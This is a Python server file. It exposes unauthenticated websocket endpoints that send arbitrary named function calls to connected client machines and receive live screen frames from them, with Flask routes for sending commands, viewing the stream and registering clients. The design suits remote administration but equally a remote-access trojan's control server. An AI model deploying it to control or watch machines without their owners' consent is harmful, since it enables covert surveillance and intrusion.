import asyncio
import websockets
import uuid
import ujson as json  # Faster JSON serialization
import time
import tempfile
import os
import threading
from flask import jsonify, request, Response

# WebSocket Configuration - using the same ports as defined in Server.py
commandPort = 4000
LiveViewPort = 8000
WS_IP = "0.0.0.0"
WS_PORT = commandPort
LIVEVIEW_WS_PORT = LiveViewPort

# Global variables
pending = {}
latest_frames = {}
last_frame_log_time = {}
clients = []

class Client:
    def __init__(self, client_id, ws):
        self.client_id = client_id
        self.ws = ws

    async def execute(self, function_name, args=None, kwargs=None):
        message_id = str(uuid.uuid4())
        message = json.dumps({
            "type": "call",
            "function": function_name,
            "args": args or [],
            "kwargs": kwargs or {},
            "id": message_id
        })

        future = asyncio.get_event_loop().create_future()
        pending[message_id] = future
        await self.ws.send(message)

        try:
            response = await asyncio.wait_for(future, timeout=3)
        except asyncio.TimeoutError:
            pending.pop(message_id, None)
            raise Exception("Timeout waiting for client response")

        return response.get("result") if "result" in response else Exception(response.get("error"))

class ClientManager:
    def __init__(self):
        self.clients = {}

    def add_client(self, client_id, ws):
        self.clients[client_id] = Client(client_id, ws)

    def remove_client(self, client_id):
        self.clients.pop(client_id, None)

    async def command(self, client_id, function_name, args=None):
        if client_id not in self.clients:
            raise Exception(f"Client '{client_id}' not found")
        return await self.clients[client_id].execute(function_name, args)

# Global client manager instance
client_manager = ClientManager()

async def handle_client(ws):
    client_id = await ws.recv()
    client_manager.add_client(client_id, ws)
    print(f"[+] {client_id} connected.")

    try:
        async for message in ws:
            data = json.loads(message)
            msg_id = data.get("id")
            if msg_id in pending:
                future = pending.pop(msg_id)
                future.set_result(data)
            else:
                print(f"[{client_id}] -> {data}")
    except websockets.exceptions.ConnectionClosed:
        print(f"[-] {client_id} disconnected")
    finally:
        client_manager.remove_client(client_id)

# WebSocket handler for live view frames from client
async def handle_liveview_client(ws):
    try:
        client_id = await ws.recv()
        print(f"[LiveView] {client_id} connected for live view.")
        while True:
            try:
                message = await ws.recv()
                latest_frames[client_id] = message
                now = time.time()
                # Only log every 2 seconds per client
                if (client_id not in last_frame_log_time) or (now - last_frame_log_time[client_id] > 2):
                    print(f"[LiveView] Received frame from {client_id}, size: {len(message)} bytes")
                    last_frame_log_time[client_id] = now
            except websockets.exceptions.ConnectionClosed:
                print(f"[LiveView] {client_id} disconnected from live view.")
                break
            except Exception as e:
                print(f"[LiveView] Error receiving frame from {client_id}: {e}")
    except Exception as e:
        print(f"[LiveView] Error in connection: {e}")
    finally:
        latest_frames.pop(client_id, None)
        last_frame_log_time.pop(client_id, None)

def save_latest_frame(client_id):
    frame = latest_frames.get(client_id)
    if frame:
        try:
            tmp_dir = tempfile.gettempdir()
            file_path = os.path.join(tmp_dir, f"{client_id}_latest.jpg")
            with open(file_path, "wb") as f:
                f.write(frame)
            print(f"[DEBUG] Saved {file_path}")
        except Exception as e:
            print(f"[DEBUG] Failed to save frame for {client_id}: {e}")

# Start WebSocket Server in Background
def start_ws_server():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    async def run_server():
        try:
            async with websockets.serve(handle_client, WS_IP, WS_PORT):
                print(f"WebSocket server running at ws://{WS_IP}:{WS_PORT}")
                await asyncio.Future()
        except Exception as e:
            print(f"[CommandWS] WebSocket server failed to start: {e}")
    try:
        loop.run_until_complete(run_server())
        loop.run_forever()
    except Exception as e:
        print(f"[CommandWS] Event loop error: {e}")

# Start a separate WebSocket server for live view frames
def start_liveview_ws_server():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    async def run_server():
        try:
            async with websockets.serve(handle_liveview_client, WS_IP, LIVEVIEW_WS_PORT, max_size=2*1024*1024):
                print(f"LiveView WebSocket server running at ws://{WS_IP}:{LIVEVIEW_WS_PORT}")
                await asyncio.Future()
        except Exception as e:
            print(f"[LiveView] WebSocket server failed to start: {e}")
    try:
        loop.run_until_complete(run_server())
        loop.run_forever()
    except Exception as e:
        print(f"[LiveView] Event loop error: {e}")

def start_websocket_servers():
    """Start both websocket servers in daemon threads"""
    from socket import gethostname
    
    threading.Thread(target=start_ws_server, daemon=True).start()
    print(f"Starting websocket command server on {gethostname()} at port: {commandPort}")

    threading.Thread(target=start_liveview_ws_server, daemon=True).start()
    print(f"Starting liveView server on {gethostname()} at port: {LiveViewPort}")

# Flask route functions that interface with the websocket servers
def send_command_handler():
    """Handler for /sendCommand route"""
    data = request.get_json()
    client_id = data.get('client_id')
    command = data.get('command')
    args = data.get('args', [])

    try:
        result = asyncio.run(client_manager.command(client_id, command, args))
        return jsonify({"status": "success", "result": result})
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 500

def liveview_handler(client_id):
    """Handler for /liveview/<client_id> route"""
    def generate():
        last_save = 0
        while True:
            try:
                frame = latest_frames.get(client_id)
                if frame:
                    yield (b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
                    now = time.time()
                    if now - last_save > 5:
                        save_latest_frame(client_id)
                        last_save = now
                time.sleep(1/10)
            except Exception as e:
                print(f"[MJPEG] Error streaming frame for {client_id}: {e}")
                break
    try:
        return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')
    except Exception as e:
        print(f"[MJPEG] Error creating response for {client_id}: {e}")
        return Response("Error streaming live view", status=500)

def register_client_handler():
    """Handler for /client/register route"""
    # Generate a unique client_id
    print("Client requesting client ID")
    client_id = str(uuid.uuid4())

    clients.append(client_id)
    
    # Optionally, store the client_id in a database or in-memory structure
    # For example: registered_clients[client_id] = {"timestamp": time.time()}
    
    print(f"[+] New client registered: {client_id}")

    return jsonify({"client_id": client_id})
